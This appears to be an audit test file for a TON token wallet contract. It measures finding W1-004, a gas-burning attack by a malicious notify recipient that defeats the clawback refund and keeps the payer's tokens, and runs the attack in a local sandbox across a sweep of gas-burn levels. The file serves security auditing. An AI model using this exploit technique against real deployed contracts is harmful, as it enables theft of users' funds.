import { describe, expect, it } from 'vitest';
import { Address, contractAddress, toNano } from '@ton/core';
import { Blockchain, createShardAccount } from '@ton/sandbox';
import { createHash } from 'crypto';
import { ATHWallet, ATHTransferRequestWithNotify } from '../build/ATHWallet/ATHWallet_ATHWallet';
import { MockGasBurnNotifyOwner } from '../build/MockGasBurnNotifyOwner/MockGasBurnNotifyOwner_MockGasBurnNotifyOwner';

// ═══════════════════════════════════════════════════════════════════════════════════════════════════════════
// W1-004 — CAN A MALICIOUS NOTIFY RECIPIENT STEAL THE PAYER'S ATH? (Волна 5 measurement)
//
// The plain notify lane credits the recipient wallet's balance BEFORE forwarding AthTransferNotification to the
// recipient's owner (ATHWallet.tact:907). If the owner rejects, the wallet claws the credit back by refunding the
// payer. The clawback refund arrives at the payer's wallet gated by 14212 (26M). The contract author already
// measured the honest stranding ("30M -> arrives 24M -> below 26M -> refund throws 14212", lines 13-34) and
// raised the notify floor to 45M so an HONEST bounce clears it (~38M arrival). W1-004 claims a MALICIOUS owner can
// burn compute gas so the bounce returns with less, dropping the clawback below 26M — and then, because the failed
// clawback bounces back and re-credits the recipient, the recipient KEEPS the ATH.
//
// This measures the end state directly across a sweep of attacker gas burn: does the recipient wallet end holding
// the payer's ATH (THEFT), does it end nowhere spendable (LIMBO), or does the clawback always win (SAFE)?
//
// RESULT (measured below): THEFT is real. With >= ~2000 loop-iterations of burned gas the recipient wallet keeps
// the full payment while the payer's wallet is left at 0; below that the honest bounce clears the 45M floor and the
// payer is refunded (SAFE). The window is trivial to hit.
//
// REACHABILITY (verified 2026-07-24): the plain notify lane IS live — MarketStabilitySeller reserve funding uses it
// (reserve_funder -> MSS AthTransferNotification), so it cannot simply be deleted. BUT the attack needs a victim
// sending WithNotify to a MALICIOUS recipient, and the only shipping-client WithNotify call is the dead Vault path
// (web/app.js:25403, notify_destination=vault, 32M < the 45M floor, behind the OFF directPay flag). So this is a
// LATENT theft on an IMMUTABLE receiver — not exploitable via the current client, but a landmine for any future
// integration that lets a user notify an attacker-controlled contract. Under the owner's "any confirmed defect
// blocks seal" bar it is a pre-seal fix; the fix is an owner decision on the money path (see the audit memo).
// ═══════════════════════════════════════════════════════════════════════════════════════════════════════════

const MASTER = new Address(0, createHash('sha256').update('PLATHO.W1004.MASTER').digest());
const N = 1_000_000_000n;                 // the ATH under attack
const NOTIFY_MIN = 45_000_000n;           // ATH_TRANSFER_NOTIFY_MIN_VALUE

async function deployWallet(bc: Blockchain, owner: Address, balance: bigint) {
  const zero = await ATHWallet.init(0n, owner, MASTER);
  const data = await ATHWallet.init(balance, owner, MASTER);
  const address = contractAddress(0, zero);
  await bc.setShardAccount(address, createShardAccount({
    address, code: zero.code, data: data.data, balance: toNano('1'), workchain: 0,
  }));
  return bc.openContract(new ATHWallet(address, zero));
}

async function walletBalance(w: any): Promise<bigint> {
  return (await w.getGetWalletData()).balance;
}

async function runAttack(burnIters: number) {
  const bc = await Blockchain.create();
  const alice = new Address(0, createHash('sha256').update('PLATHO.W1004.ALICE').digest());

  // Mallory's owner is the gas-burning contract; Mallory's wallet is derived from it.
  const mockInit = await MockGasBurnNotifyOwner.init(BigInt(burnIters));
  const mockAddr = contractAddress(0, mockInit);
  await bc.setShardAccount(mockAddr, createShardAccount({
    address: mockAddr, code: mockInit.code, data: mockInit.data, balance: toNano('1'), workchain: 0,
  }));

  const aliceWallet = await deployWallet(bc, alice, N);          // Alice funds the transfer
  const malloryWallet = await deployWallet(bc, mockAddr, 0n);    // recipient wallet, owner = mock

  await aliceWallet.send(bc.sender(alice), { value: toNano('0.5') }, {
    $$type: 'ATHTransferRequestWithNotify',
    query_id: 1n,
    amount: N,
    recipient: mockAddr,               // recipient OWNER
    response_destination: alice,
    notify_destination: mockAddr,      // must equal recipient (gate 14302) and the recipient wallet's owner (14312)
    notify_value: NOTIFY_MIN,
  } as ATHTransferRequestWithNotify);

  return {
    alice: await walletBalance(aliceWallet),
    mallory: await walletBalance(malloryWallet),
  };
}

describe('W1-004 — malicious notify recipient: theft, limbo, or safe?', () => {
  it('W1004-SWEEP: sweep attacker gas burn and report where the ATH ends up', async () => {
    const rows: string[] = [];
    let theftSeen = false;
    // Honest bounce clears; the attack window is where burned gas pulls the clawback below 26M.
    for (const iters of [0, 500, 1000, 2000, 3000, 4000, 5000, 6000, 8000, 10000, 15000, 20000]) {
      const { alice, mallory } = await runAttack(iters);
      const verdict = mallory === N ? 'THEFT(mallory=+N)'
        : alice === N ? 'SAFE(alice refunded)'
        : (alice === 0n && mallory === 0n) ? 'LIMBO(ath nowhere)'
        : `OTHER(alice=${alice} mallory=${mallory})`;
      if (mallory === N) theftSeen = true;
      rows.push(`iters=${iters}: alice=${alice} mallory=${mallory} -> ${verdict}`);
    }
    // eslint-disable-next-line no-console
    console.log('[W1004-SWEEP]\n  ' + rows.join('\n  '));
    // This test characterises; the assertion just guarantees the sweep produced readable data.
    expect(rows.length).toBe(12);
    // eslint-disable-next-line no-console
    console.log(`[W1004-SWEEP] theft window observed: ${theftSeen}`);
  }, 300_000);
});
